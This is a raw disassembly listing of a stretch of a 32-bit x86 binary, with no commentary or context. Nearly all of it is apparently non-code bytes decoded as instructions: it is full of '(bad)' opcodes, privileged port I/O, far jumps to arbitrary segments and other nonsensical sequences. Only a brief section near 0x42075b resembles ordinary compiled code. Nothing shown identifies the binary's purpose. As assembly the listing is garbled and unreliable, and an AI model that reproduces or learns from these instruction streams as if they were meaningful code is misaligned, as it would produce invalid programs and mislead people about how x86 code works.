  420353:	add    BYTE PTR [ecx+0x1a54e9],al
  420359:	add    BYTE PTR [ecx+0x25acf1],al
  42035f:	add    BYTE PTR [ebx-0x1036b],cl
  420365:	(bad)  
  420366:	jmp    0x42074d
  42036b:	pop    eax
  42036c:	dec    ecx
  42036d:	xchg   esi,eax
  42036e:	jmp    0x42030c
  420370:	cmp    al,0xbc
  420372:	jns    0x4203a4
  420374:	inc    edx
  420375:	aad    0xe3
  420377:	mov    cl,0x6c
  420379:	sub    al,0xd1
  42037b:	out    dx,eax
  42037c:	popf   
  42037d:	sar    BYTE PTR [esi-0x41413bb6],0x45
  420384:	inc    edx
  420385:	jo     0x420362
  420387:	out    0x4f,eax
  420389:	pushf  
  42038a:	int    0xf9
  42038c:	leave  
  42038d:	imul   eax,DWORD PTR [ecx+0x19],0xffffffd8
  420391:	and    DWORD PTR [edi-0x35],ecx
  420394:	ror    DWORD PTR [esi-0x46],0xa5
  420398:	(bad)  
  42039a:	outs   dx,BYTE PTR ds:[esi]
  42039b:	mov    edi,0xd6f2e35c
  4203a0:	jle    0x42041c
  4203a2:	mov    esp,0xd75085f7
  4203a7:	mov    al,dl
  4203a9:	push   0x4d
  4203ab:	pop    eax
  4203ac:	imul   DWORD PTR ds:0x4ec26689
  4203b2:	mov    esp,0x6f7630e8
  4203b7:	mov    ebx,0x170e60b1
  4203bc:	retf   
  4203bd:	push   ebx
  4203be:	xor    al,0x40
  4203c0:	mov    bl,0x9
  4203c2:	in     al,dx
  4203c3:	or     DWORD PTR [edx],0x2ee7ba87
  4203c9:	xor    BYTE PTR [ebp+0x1578dac0],dh
  4203cf:	gs call 0xd2a4:0xa815a550
  4203d7:	push   es
  4203d8:	xor    eax,0x17c23223
  4203dd:	jno    0x420368
  4203df:	mov    al,ds:0xc93fbd8
  4203e4:	cdq    
  4203e5:	or     eax,0x2ecc2a07
  4203ea:	mov    eax,0x8a68fcc7
  4203ef:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203f1:	mov    edx,0x60c3785
  4203f6:	and    eax,0x6a2d0944
  4203fb:	and    ebx,ecx
  4203fd:	(bad)  
  4203fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203ff:	mov    cl,0xfc
  420401:	inc    eax
  420402:	icebp  
  420403:	mov    esi,0x58da8fb9
  420408:	mov    edi,0x5fa8f40b
  42040d:	in     eax,dx
  42040e:	xor    BYTE PTR [esi+0x1654ff9e],dh
  420414:	(bad)  
  420415:	mov    bh,0x15
  420417:	sbb    esp,DWORD PTR [ebp+0x4888cdad]
  42041d:	int3   
  42041e:	loope  0x420499
  420420:	cdq    
  420421:	jmp    0x20bd:0xb74d1807
  420428:	stc    
  420429:	inc    esi
  42042a:	and    al,0xab
  42042c:	outs   dx,BYTE PTR ds:[esi]
  42042d:	jo     0x4203cb
  42042f:	(bad)  
  420430:	xchg   ebp,eax
  420431:	bound  esi,QWORD PTR [edx-0x66]
  420434:	mov    ecx,0xc1867838
  420439:	mov    esp,0xa00cecc7
  42043e:	leave  
  42043f:	inc    edx
  420440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420441:	out    dx,al
  420442:	push   eax
  420443:	pop    ds
  420444:	mov    ch,0xde
  420446:	dec    ecx
  420447:	test   BYTE PTR [ebx+0x143e3b4],bh
  42044d:	xchg   ebp,eax
  42044e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42044f:	and    ecx,ecx
  420451:	xchg   ebx,eax
  420452:	xchg   BYTE PTR [ecx+0x30af53fa],dh
  420458:	xchg   edx,eax
  420459:	fild   QWORD PTR [esi+edi*2+0x29]
  42045d:	std    
  42045e:	cmp    bh,ch
  420460:	cli    
  420461:	lods   eax,DWORD PTR ds:[esi]
  420462:	xor    esp,DWORD PTR [eax+0x745d15b1]
  420468:	push   eax
  420469:	mov    bl,0x9c
  42046b:	in     eax,0x3b
  42046d:	sbb    ah,BYTE PTR [edx]
  42046f:	sbb    eax,0xcd05d799
  420474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420475:	loope  0x420454
  420477:	mov    eax,ds:0x2d5810ab
  42047c:	clc    
  42047d:	mov    ds:0x54550714,al
  420482:	nop
  420483:	push   cs
  420484:	bound  ebx,QWORD PTR [ecx]
  420486:	pcmpgtb mm0,mm2
  420489:	popa   
  42048a:	rcl    DWORD PTR ds:0x6a9c0cf0,cl
  420490:	mov    ch,0x84
  420492:	dec    eax
  420493:	push   ss
  420494:	dec    eax
  420495:	clc    
  420496:	push   ss
  420497:	je     0x4204e0
  420499:	cmc    
  42049a:	cmp    edx,edi
  42049c:	aaa    
  42049d:	mov    ecx,0x5392c847
  4204a2:	int3   
  4204a3:	or     DWORD PTR [eax+eiz*2-0x59],ebp
  4204a7:	and    dh,BYTE PTR [edi+0x12]
  4204aa:	jmp    0x15ec545c
  4204af:	jbe    0x420462
  4204b1:	jl     0x4204a0
  4204b3:	adc    al,0xf2
  4204b5:	scas   eax,DWORD PTR es:[edi]
  4204b6:	rcl    DWORD PTR [esi-0x48e93f76],1
  4204bc:	mov    ebp,0xcdac86a6
  4204c1:	daa    
  4204c2:	retf   
  4204c3:	fdivr  DWORD PTR [edx+edx*4]
  4204c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204c7:	cmp    DWORD PTR [ecx+ebp*8-0x30b85b61],esp
  4204ce:	xchg   BYTE PTR [ebp+0x70],cl
  4204d1:	sub    eax,DWORD PTR [ecx-0x3f32147c]
  4204d7:	inc    esp
  4204d8:	ret    
  4204d9:	idiv   DWORD PTR ds:[ecx-0x71]
  4204dd:	mov    BYTE PTR [ecx-0x65],cl
  4204e0:	push   0xffffffcb
  4204e2:	adc    DWORD PTR [ebp+0x6f],esi
  4204e5:	stos   BYTE PTR es:[edi],al
  4204e6:	inc    edx
  4204e7:	fld    TBYTE PTR [edi-0x2f630ac9]
  4204ed:	mov    dh,BYTE PTR [edx+edx*8]
  4204f0:	lahf   
  4204f1:	cmp    DWORD PTR [ebx+0x46],0xb6d9bab3
  4204f8:	dec    esp
  4204f9:	(bad)  
  4204fa:	sbb    BYTE PTR [esp+esi*8+0x4faf9f0c],dh
  420501:	inc    ebp
  420502:	mov    eax,0xbef736e2
  420507:	adc    edi,eax
  420509:	xor    eax,0x5b15046b
  42050e:	test   eax,0x8cb6e161
  420513:	ja     0x42051b
  420515:	inc    ebx
  420516:	imul   ecx,DWORD PTR [ebx-0x28e22546],0xffffffa3
  42051d:	popf   
  42051e:	mov    esp,0xc876350d
  420523:	lods   eax,DWORD PTR ds:[esi]
  420524:	scas   al,BYTE PTR es:[edi]
  420525:	add    eax,0xd3e089c4
  42052a:	in     eax,0x32
  42052c:	xor    al,0xc7
  42052e:	mov    WORD PTR [ecx-0x93dbdd6],?
  420534:	imul   esp,DWORD PTR [eax-0x4e],0x1c
  420538:	mov    esi,0x3a2e7402
  42053d:	mov    bl,0xf3
  42053f:	fcom   DWORD PTR [ebx+0x15]
  420542:	mov    ebp,0xc308fdf0
  420547:	rcr    DWORD PTR [ebx+0x46],0x1c
  42054b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42054c:	pop    eax
  42054d:	cmp    al,0x9d
  42054f:	mov    eax,?
  420551:	jl     0x42058d
  420553:	or     esp,edi
  420555:	cmp    edx,esp
  420557:	cmp    eax,0x1de04a2
  42055c:	outs   dx,BYTE PTR ds:[esi]
  42055d:	dec    ecx
  42055e:	bound  ebp,QWORD PTR [esi+0x31]
  420561:	jge    0x42057c
  420563:	push   ebp
  420564:	loop   0x420549
  420566:	mov    ds:0xe2d5f608,al
  42056b:	inc    edx
  42056c:	cmp    BYTE PTR [esi],al
  42056e:	loop   0x42053f
  420570:	sti    
  420571:	mov    esi,0x19ef2b01
  420576:	repz push esi
  420578:	jno    0x4205e5
  42057a:	mov    ebp,DWORD PTR [eax-0x23]
  42057d:	inc    eax
  42057e:	inc    ebx
  42057f:	cmp    edi,DWORD PTR [ebx]
  420581:	or     al,0xe
  420583:	dec    edx
  420584:	sti    
  420585:	out    0x94,eax
  420587:	fs inc edx
  420589:	data16 xchg ch,dl
  42058c:	stos   BYTE PTR es:[edi],al
  42058d:	inc    esi
  42058e:	jmp    0xb9d2:0xc68c552d
  420595:	lock mov ds:0xba4baee2,eax
  42059b:	inc    edi
  42059c:	pop    esp
  42059d:	mov    BYTE PTR [ebp+ebp*2-0x40],ch
  4205a1:	sbb    ecx,esp
  4205a3:	shl    BYTE PTR [eax],cl
  4205a5:	addr16 mov eax,ds:0x85b9
  4205a9:	rcl    eax,0xc7
  4205ac:	mov    edi,0x5b675d52
  4205b1:	push   0xa2fe8b66
  4205b6:	jge    0x4205e2
  4205b8:	sbb    edx,DWORD PTR [edi-0x27]
  4205bb:	sub    al,0xb8
  4205bd:	out    0xb0,al
  4205bf:	pop    eax
  4205c0:	jbe    0x4205be
  4205c2:	shr    DWORD PTR [esi+edx*1+0x6f5f72a4],1
  4205c9:	push   0xffffffeb
  4205cb:	dec    esi
  4205cc:	fcomp  QWORD PTR [eax+0x6f0f61a0]
  4205d2:	add    BYTE PTR [edx],ah
  4205d4:	dec    edx
  4205d5:	jmp    0x42056e
  4205d7:	mov    eax,ds:0xfe02b7c
  4205dc:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205de:	clc    
  4205df:	(bad)  
  4205e0:	fst    DWORD PTR [edx-0x6b77abcc]
  4205e6:	cmp    eax,DWORD PTR [ebx-0xbdd9d6e]
  4205ec:	push   cs
  4205ed:	test   BYTE PTR [ecx+0x54],ch
  4205f0:	cs jg  0x42064c
  4205f3:	inc    esi
  4205f4:	call   0x737:0xa1ac3940
  4205fb:	sbb    BYTE PTR [ebx+ebx*2-0x2cfe822b],dl
  420602:	add    eax,0xd885d32d
  420607:	mov    ds:0x7e301ee6,eax
  42060c:	and    DWORD PTR [eax-0x4e96c11c],0x36
  420613:	mov    ebp,0x3dda9fad
  420618:	imul   ecx,DWORD PTR [esi+0x49],0x1b127808
  42061f:	out    dx,al
  420620:	sub    BYTE PTR [edx+0x7b8aba5c],dl
  420626:	adc    DWORD PTR [edx-0x5cc73890],edx
  42062c:	neg    DWORD PTR [edx-0x73]
  42062f:	pop    esi
  420630:	pushf  
  420631:	pop    edi
  420632:	mov    ch,0x70
  420634:	dec    esp
  420635:	xor    eax,0x59c5712a
  42063a:	out    dx,eax
  42063b:	aaa    
  42063c:	int3   
  42063d:	dec    ebx
  42063e:	sti    
  42063f:	xchg   BYTE PTR [edi-0x6ee7f632],dl
  420645:	jl     0x4205f1
  420647:	sbb    BYTE PTR [ebp+0x72],dh
  42064a:	lock mov esp,0xc5222325
  420650:	mov    eax,ds:0x5162064b
  420655:	and    eax,0xcdc75e63
  42065a:	mov    eax,0xc4807e2d
  42065f:	fcom   DWORD PTR [eax-0x44]
  420662:	fld    QWORD PTR [esi]
  420664:	and    BYTE PTR [esi+0x57350be1],0x12
  42066b:	pop    esp
  42066c:	or     eax,0x924bb157
  420671:	xchg   esi,eax
  420672:	les    eax,FWORD PTR [esp+edx*4]
  420675:	sub    ah,bl
  420677:	add    BYTE PTR [edi+0x43],dh
  42067a:	mov    esp,0xe87fcffa
  42067f:	in     al,0x51
  420681:	fsub   DWORD PTR [ebx-0x145d1613]
  420687:	fwait
  420688:	push   esi
  420689:	pop    es
  42068a:	call   0xf5a9:0xb51f3e14
  420691:	jmp    0x1aad380f
  420696:	test   al,0xb2
  420698:	repz mov dl,0x5f
  42069b:	(bad)  
  42069c:	jl     0x420704
  42069e:	xor    BYTE PTR [edi+0x6537d2ed],al
  4206a4:	shl    dh,1
  4206a6:	scas   eax,DWORD PTR es:[edi]
  4206a7:	push   0x5c788eee
  4206ac:	and    ah,bl
  4206ae:	inc    edi
  4206af:	mov    eax,0xc25e319c
  4206b4:	pushf  
  4206b5:	stos   BYTE PTR es:[edi],al
  4206b6:	into   
  4206b7:	mov    ah,0x64
  4206b9:	aam    0x2d
  4206bb:	add    BYTE PTR [ecx+0x6a],bh
  4206be:	mov    bl,BYTE PTR [edx]
  4206c0:	es pusha 
  4206c2:	xor    DWORD PTR [esi-0x64295e80],eax
  4206c8:	arpl   WORD PTR [edx+0x63],cx
  4206cb:	test   al,0x5c
  4206cd:	cld    
  4206ce:	and    ebp,DWORD PTR [eax+edi*8-0x6bd8f24b]
  4206d5:	mov    bh,0x22
  4206d7:	xor    eax,0xc6e2abee
  4206dc:	pop    esi
  4206dd:	repz rol DWORD PTR [ecx-0x2bd28dc8],0x16
  4206e5:	imul   BYTE PTR [ebx+0x6e]
  4206e8:	mov    gs,esi
  4206ea:	and    DWORD PTR [edi],esi
  4206ec:	jp     0x4206db
  4206ee:	sub    eax,DWORD PTR [ebp+0x70]
  4206f1:	cmp    BYTE PTR [eax+0x46],ch
  4206f4:	push   edx
  4206f5:	in     eax,dx
  4206f6:	xor    ah,BYTE PTR [ebx+0x11]
  4206f9:	mov    ch,0xa7
  4206fb:	fs int3 
  4206fd:	popf   
  4206fe:	mov    eax,0x2f68322c
  420703:	or     BYTE PTR [edi+0x656753ba],bl
  420709:	add    DWORD PTR [ecx],ecx
  42070b:	imul   ebp,DWORD PTR [eax-0x3041b975],0xffffffc7
  420712:	jo     0x42069c
  420714:	nop
  420715:	loope  0x420748
  420717:	test   eax,0x4daa6b16
  42071c:	jg     0x42075c
  42071e:	mov    esi,0x2bef9d62
  420723:	call   0xbbe8b1d7
  420728:	ret    0x870b
  42072b:	add    ch,cl
  42072d:	sub    ebp,DWORD PTR [ecx]
  42072f:	mov    cl,0x1
  420731:	or     ecx,DWORD PTR [esi-0x6912e910]
  420737:	cwde   
  420738:	and    DWORD PTR [ebx],edi
  42073a:	xchg   edx,eax
  42073b:	lods   eax,DWORD PTR ds:[esi]
  42073c:	inc    edx
  42073d:	dec    ecx
  42073e:	pusha  
  42073f:	inc    ebp
  420740:	sub    ah,cl
  420742:	dec    eax
  420743:	inc    edx
  420744:	mov    ebp,esp
  420746:	ror    BYTE PTR [edi+0x6c],cl
  420749:	xor    al,0xf2
  42074b:	pusha  
  42074c:	mov    BYTE PTR [ecx+0x6ddaf2],al
  420752:	add    BYTE PTR [ebx-0x1074b],cl
  420758:	jmp    DWORD PTR [ebx]
  42075a:	(bad)  
  42075b:	and    edx,0xe0c
  420761:	or     edx,0x5b
  420764:	mov    esi,DWORD PTR [ebp-0xe8]
  42076a:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42076e:	add    ecx,eax
  420770:	lea    eax,[edx+ecx*1-0xc5b]
  420777:	mov    DWORD PTR [ebp-0xa8],eax
  42077d:	and    DWORD PTR [ebp-0x144],0x0
  420784:	jmp    0x420b7d
  420789:	mov    eax,DWORD PTR [ebp-0x144]
  42078f:	inc    eax
  420790:	mov    DWORD PTR [ebp-0x144],eax
  420796:	jmp    0x420b7d
  42079b:	daa    
  42079c:	cmp    eax,0x75b775ce
  4207a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a2:	(bad)  
  4207a3:	xchg   ecx,eax
  4207a4:	(bad)  
  4207a5:	dec    esi
  4207a6:	sahf   
  4207a7:	pusha  
  4207a8:	or     eax,0xa37ce3a8
  4207ad:	sar    BYTE PTR [esi-0x41413bb6],0x8e
  4207b4:	xor    eax,0x5c239262
  4207b9:	mov    ebp,0x47146203
  4207be:	cmp    DWORD PTR [eax+0x2d1080a],edi
  4207c4:	(bad)  
  4207c5:	mov    bh,0xca
  4207c7:	out    0xba,eax
  4207c9:	jecxz  0x420797
  4207cb:	shl    DWORD PTR [ecx],1
  4207cd:	jp     0x4207c8
  4207cf:	scas   al,BYTE PTR es:[edi]
  4207d0:	pop    edx
  4207d1:	out    0x4e,eax
  4207d3:	mov    edx,ds
  4207d5:	aaa    
  4207d6:	adc    BYTE PTR [ebx+edi*2+0x2ba82d69],cl
  4207dd:	loop   0x4207cb
  4207df:	ficomp WORD PTR [eax-0x75aca104]
  4207e5:	cmp    ecx,edi
  4207e7:	cmp    ecx,DWORD PTR [edi]
  4207e9:	and    al,0xba
  4207eb:	call   0x8e12f263
  4207f0:	ds adc al,0x67
  4207f3:	std    
  4207f4:	and    al,0xc8
  4207f6:	add    eax,0x173e0c3e
  4207fb:	xchg   DWORD PTR [edx+0x9],esp
  4207fe:	mov    ah,0xa9
  420800:	pop    es
  420801:	test   edx,ebp
  420803:	adc    edi,DWORD PTR [ebx+0x69f6bda5]
  420809:	sub    cl,al
  42080b:	sbb    ah,BYTE PTR [eax-0x1ae920a1]
  420811:	sar    DWORD PTR [eax-0x52b393e9],0xdf
  420818:	jb     0x420806
  42081a:	push   es
  42081b:	xchg   edi,eax
  42081c:	aas    
  42081d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42081e:	xor    BYTE PTR [eax-0x67],ch
  420821:	inc    edx
  420822:	aas    
  420823:	jnp    0x4207cb
  420825:	aaa    
  420826:	sti    
  420827:	lods   eax,DWORD PTR ds:[esi]
  420828:	aad    0x4
  42082a:	fdiv   QWORD PTR [eax]
  42082c:	fwait
  42082d:	dec    ebx
  42082e:	outs   dx,BYTE PTR ds:[esi]
  42082f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420830:	mov    bl,0xaf
  420832:	xchg   ebp,eax
  420833:	and    al,0xa7
  420835:	pusha  
  420836:	adc    DWORD PTR [edx],ebp
  420838:	cmc    
  420839:	scas   al,BYTE PTR es:[edi]
  42083a:	mov    cl,BYTE PTR [ecx-0x7dba3bc5]
  420840:	fsubr  DWORD PTR [esi-0x33b91f93]
  420846:	test   DWORD PTR ds:0xc4770275,ecx
  42084c:	imul   ebx,DWORD PTR [ecx-0x58],0x27
  420850:	mov    ecx,0xd7975afd
  420855:	arpl   WORD PTR [eax+0x23c9df01],bp
  42085b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42085c:	lds    ecx,FWORD PTR [eax+0x4591a085]
  420862:	jg     0x42081c
  420864:	or     ecx,ebx
  420866:	cld    
  420867:	adc    eax,0xc70ea410
  42086c:	xchg   edx,eax
  42086d:	mov    ecx,0x1fc964
  420872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420873:	mov    edi,0x31d3472
  420878:	rcl    DWORD PTR [ecx-0x26947d5b],0xc
  42087f:	inc    ecx
  420880:	ins    DWORD PTR es:[edi],dx
  420881:	fsub   st(6),st
  420883:	gs xor eax,0xfcc1de25
  420889:	stos   DWORD PTR es:[edi],eax
  42088a:	dec    ecx
  42088b:	das    
  42088c:	adc    bl,BYTE PTR [edi+esi*4+0x6367b979]
  420893:	arpl   WORD PTR [eax-0x18],ax
  420896:	imul   edi,DWORD PTR [ecx+0x6],0xa1a16842
  42089d:	call   0x1980487f
  4208a2:	loopne 0x4208d3
  4208a4:	(bad)  
  4208a5:	adc    eax,0x93972363
  4208aa:	ret    
  4208ab:	out    dx,al
  4208ac:	dec    edx
  4208ad:	(bad)  
  4208ae:	pop    esp
  4208af:	adc    edi,edx
  4208b1:	xchg   ebx,eax
  4208b2:	pop    ebp
  4208b3:	add    BYTE PTR [esp+ecx*1],bl
  4208b6:	fmul   st,st(3)
  4208b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208b9:	jne    0x420868
  4208bb:	fwait
  4208bc:	mov    eax,ds:0x433e146
  4208c1:	push   esp
  4208c2:	pop    ss
  4208c3:	mov    ds:0x3d847070,eax
  4208c8:	enter  0x6f02,0x4
  4208cc:	add    eax,0xcb1b919d
  4208d1:	push   ds
  4208d2:	loop   0x420939
  4208d4:	(bad)  
  4208d5:	push   edi
  4208d6:	ins    DWORD PTR es:[edi],dx
  4208d7:	sub    DWORD PTR [eax-0x41e16e00],esp
  4208dd:	(bad)  
  4208df:	push   eax
  4208e0:	stos   DWORD PTR es:[edi],eax
  4208e1:	sbb    eax,0xd9eca3cf
  4208e6:	loop   0x42087f
  4208e8:	push   esi
  4208e9:	stc    
  4208ea:	mov    ?,WORD PTR [edx]
  4208ec:	test   al,0x65
  4208ee:	pushf  
  4208ef:	dec    eax
  4208f0:	fs adc al,0x8a
  4208f3:	cmp    bh,BYTE PTR [edx]
  4208f5:	pop    ecx
  4208f6:	xor    eax,0xef114bfe
  4208fb:	retf   0xcf69
  4208fe:	es xor al,0xc
  420901:	idiv   BYTE PTR [ebx-0x41]
  420904:	sub    al,0x1c
  420906:	(bad)  
  420907:	mov    fs,ebp
  420909:	scas   al,BYTE PTR es:[edi]
  42090a:	xchg   ecx,eax
  42090b:	das    
  42090c:	sbb    edi,edx
  42090e:	pop    ss
  42090f:	imul   esi,DWORD PTR [eax-0x258e9d99],0x21e2b4d5
  420919:	xor    al,0x51
  42091b:	mov    bp,0x6510
  42091f:	mov    bl,0x6a
  420921:	pop    es
  420922:	push   0x1b
  420924:	sbb    al,0xfe
  420926:	cdq    
  420927:	rcl    DWORD PTR [esi],1
  420929:	sbb    eax,0xa29ae77d
  42092e:	pushf  
  42092f:	sahf   
  420930:	stc    
  420931:	imul   eax,DWORD PTR [eax-0x35],0xffffff88
  420935:	imul   ebp,edi,0xffffffe5
  420938:	cmp    BYTE PTR [esi],ch
  42093a:	js     0x420943
  42093c:	mov    edi,0xec56d2d
  420941:	ss dec ebx
  420943:	dec    ebp
  420944:	stc    
  420945:	(bad)  
  420946:	xchg   esp,eax
  420947:	and    DWORD PTR [ecx+esi*1-0x6b],edx
  42094b:	(bad)  
  42094d:	mov    dh,0x7d
  42094f:	stos   BYTE PTR es:[edi],al
  420950:	mov    ch,0xef
  420952:	add    esi,DWORD PTR [ebx-0x2]
  420955:	(bad)  
  420956:	rcr    al,cl
  420958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420959:	cdq    
  42095a:	push   0x2dbfb892
  42095f:	xchg   cl,dl
  420961:	jmp    0x9eb7:0x5b064db6
  420968:	mov    ds:0xbdf8656b,al
  42096d:	adc    BYTE PTR [esi*1+0x67b67e2a],0x19
  420975:	loop   0x420947
  420977:	(bad)  
  420978:	pop    eax
  420979:	jne    0x42095f
  42097b:	mov    edi,0xf9049e83
  420980:	and    al,BYTE PTR [eax-0x20237dac]
  420986:	mov    ah,0x98
  420988:	gs call 0x1044:0x1dad0f75
  420990:	mov    edx,0x2f114c77
  420995:	int    0x88
  420997:	dec    esi
  420998:	pusha  
  420999:	not    BYTE PTR [esi+0x2334ada5]
  42099f:	xchg   ebx,eax
  4209a0:	pop    eax
  4209a1:	repz call 0x21cc2b53
  4209a7:	fwait
  4209a8:	imul   esp,DWORD PTR [edx+ebx*4],0xeb5fe112
  4209af:	sti    
  4209b0:	inc    eax
  4209b1:	xchg   ecx,eax
  4209b2:	push   0x43
  4209b4:	stos   DWORD PTR es:[edi],eax
  4209b5:	xchg   edi,eax
  4209b6:	xchg   esi,eax
  4209b7:	repz popf 
  4209b9:	jno    0x4209f7
  4209bb:	loop   0x4209b5
  4209bd:	js     0x4209ea
  4209bf:	xchg   ecx,eax
  4209c0:	sbb    edi,ebx
  4209c2:	and    BYTE PTR [edx+0x4a2623c],ch
  4209c8:	cmp    DWORD PTR [edx+0x6e12202d],eax
  4209ce:	sbb    BYTE PTR [ebp+0x5fee98b4],dl
  4209d4:	pusha  
  4209d5:	push   esi
  4209d6:	icebp  
  4209d7:	lds    eax,FWORD PTR [edi-0x6f]
  4209da:	imul   ebx,DWORD PTR [edi-0x59],0xffffffc6
  4209de:	adc    esi,DWORD PTR [eax-0x1d671f67]
  4209e4:	lea    eax,[edx-0x4e]
  4209e7:	fldl2t 
  4209e9:	push   ebp
  4209ea:	dec    eax
  4209eb:	jecxz  0x420a51
  4209ed:	adc    ah,ah
  4209ef:	xchg   ecx,eax
  4209f0:	(bad)  
  4209f1:	jns    0x420a29
  4209f3:	jecxz  0x4209b2
  4209f5:	mov    ss,WORD PTR [esi+0x74d743b]
  4209fb:	loop   0x420a78
  4209fd:	jp     0x420a79
  4209ff:	sub    edi,DWORD PTR [edi+0x5]
  420a02:	ret    0xc7ef
  420a05:	pop    ebx
  420a06:	gs and eax,0xc732e4f0
  420a0c:	inc    edi
  420a0d:	pop    ds
  420a0e:	jno    0x420a51
  420a10:	fcom   DWORD PTR [edx+0x74]
  420a13:	mov    ebp,0xd9c335f8
  420a18:	fimul  WORD PTR [esi+0x66]
  420a1b:	in     eax,dx
  420a1c:	aas    
  420a1d:	test   BYTE PTR [ecx+0x31],ah
  420a20:	stos   DWORD PTR es:[edi],eax
  420a21:	sub    eax,0xd8c31321
  420a26:	not    BYTE PTR [eax]
  420a28:	pop    ebx
  420a29:	sub    dl,ch
  420a2b:	jmp    0xfe3834b2
  420a30:	mov    ah,0xbb
  420a32:	addr16 pop esi
  420a34:	xchg   edi,eax
  420a35:	add    bh,bh
  420a37:	add    BYTE PTR [edi],bh
  420a39:	adc    al,0xd9
  420a3b:	push   0x40
  420a3d:	pop    ebp
  420a3e:	cmp    edi,DWORD PTR [edx+0x20f4516f]
  420a44:	jl     0x420a15
  420a46:	jnp    0x4209d4
  420a48:	out    dx,eax
  420a49:	aaa    
  420a4a:	adc    DWORD PTR [edi-0x39],0xf89292ca
  420a51:	int3   
  420a52:	mov    BYTE PTR [edi+0x6669da2],bl
  420a58:	mov    eax,0x64fc5312
  420a5d:	xchg   edi,eax
  420a5f:	sbb    DWORD PTR [ecx+0x34936ea9],edx
  420a65:	loopne 0x420aad
  420a67:	xor    ah,ch
  420a69:	mov    WORD PTR [esi-0x4b],fs
  420a6c:	dec    edx
  420a6d:	xchg   DWORD PTR [edx+0x9],edx
  420a70:	cmp    BYTE PTR [ebx],cl
  420a72:	dec    ecx
  420a73:	dec    esi
  420a74:	bound  edi,QWORD PTR [ebx]
  420a76:	pop    esi
  420a77:	sbb    esi,DWORD PTR [ebp-0x6a8f08cc]
  420a7d:	call   FWORD PTR [edi]
  420a7f:	mov    ebp,0x1cb71781
  420a84:	or     eax,0x8c792c8d
  420a89:	or     edx,DWORD PTR [ebx]
  420a8b:	jmp    0x420ae4
  420a8d:	gs aaa 
  420a8f:	es pop edi
  420a91:	fild   QWORD PTR [edi+0x27e62824]
  420a97:	call   0xaf025c3f
  420a9c:	dec    ebx
  420a9d:	mov    dh,0x51
  420a9f:	xor    DWORD PTR [eax+0x3f],0x41
  420aa3:	xor    ch,BYTE PTR [edx+0x7ae0097a]
  420aa9:	xchg   edi,eax
  420aaa:	pop    ebp
  420aab:	arpl   WORD PTR [esi+0x18337f74],bx
  420ab1:	push   edi
  420ab2:	mov    ds:0x10838596,eax
  420ab7:	adc    eax,0x6c7544c4
  420abc:	mov    ch,dh
  420abe:	inc    ecx
  420abf:	add    eax,0xdea459b8
  420ac4:	dec    ebp
  420ac5:	in     eax,dx
  420ac6:	test   DWORD PTR [edx-0x4b],0xdb74772
  420acd:	push   edi
  420ace:	sub    ch,BYTE PTR [edx+0x2]
  420ad1:	fsubr  DWORD PTR [edi+edx*2+0x69]
  420ad5:	lds    edi,FWORD PTR [eax]
  420ad7:	data16 (bad) 
  420ad9:	in     eax,dx
  420ada:	scas   al,BYTE PTR es:[edi]
  420adb:	jge    0x420b3e
  420add:	push   0x6f244a93
  420ae2:	jmp    0xfc44:0xf60c2054
  420ae9:	adc    ebp,DWORD PTR [eax]
  420aeb:	jbe    0x420b57
  420aed:	gs xchg ebx,eax
  420aef:	add    cl,BYTE PTR [esp+eax*1+0xa]
  420af3:	rol    BYTE PTR [eax+0x36],1
  420af6:	jl     0x420b63
  420af8:	mov    ecx,0xf0d462af
  420afd:	xchg   DWORD PTR [edx],esp
  420aff:	push   eax
  420b00:	repz xchg ebx,eax
  420b02:	lods   eax,DWORD PTR ds:[esi]
  420b03:	adc    ch,BYTE PTR [ebp+0x7e]
  420b06:	cwde   
  420b07:	cmp    BYTE PTR [ebp+0x29],cl
  420b0a:	push   ecx
  420b0b:	aam    0xa
  420b0d:	sti    
  420b0e:	mov    bl,0x35
  420b10:	inc    eax
  420b11:	and    eax,0x7ede17eb
  420b16:	mov    al,0xad
  420b18:	xchg   edi,eax
  420b19:	mov    ecx,0x9f4ac0ff
  420b1e:	adc    ebx,eax
  420b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b21:	icebp  
  420b22:	push   ecx
  420b23:	pop    ss
  420b24:	xchg   DWORD PTR [ecx-0x59cb3f3e],ebx
  420b2a:	fld    DWORD PTR [edx-0x2e]
  420b2d:	in     eax,dx
  420b2e:	and    edi,DWORD PTR [ecx]
  420b30:	test   DWORD PTR [edi],0xb6ca50d3
  420b36:	push   0xffffffc2
  420b38:	adc    DWORD PTR [eax],ebx
  420b3a:	mov    eax,0x70db9e90
  420b3f:	and    al,0xe3
  420b41:	ins    DWORD PTR es:[edi],dx
  420b42:	push   ebp
  420b43:	repnz pop eax
  420b45:	enter  0xcf9e,0x34
  420b49:	xchg   esp,eax
  420b4a:	loope  0x420b1f
  420b4c:	cdq    
  420b4d:	push   0xffffffb5
  420b4f:	test   bl,ah
  420b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b52:	mov    dl,0xb8
  420b54:	fdivr  DWORD PTR [esi+ebx*2+0x12]
  420b58:	mov    bh,0x82
  420b5a:	push   ebp
  420b5b:	push   cs
  420b5c:	xor    eax,0xdd0d136e
  420b61:	sub    DWORD PTR [ebp+0x274809b],ecx
  420b67:	jmp    0xd0e4a265
  420b6c:	leave  
  420b6d:	test   BYTE PTR [eax-0xb7fddf8],ah
  420b73:	aas    
  420b74:	out    dx,al
  420b75:	in     al,dx
  420b76:	lahf   
  420b77:	repnz adc dl,BYTE PTR [ebx-0x12]
  420b7b:	popa   
  420b7c:	cmp    al,0x8b
  420b7e:	test   DWORD PTR [eax],ebx
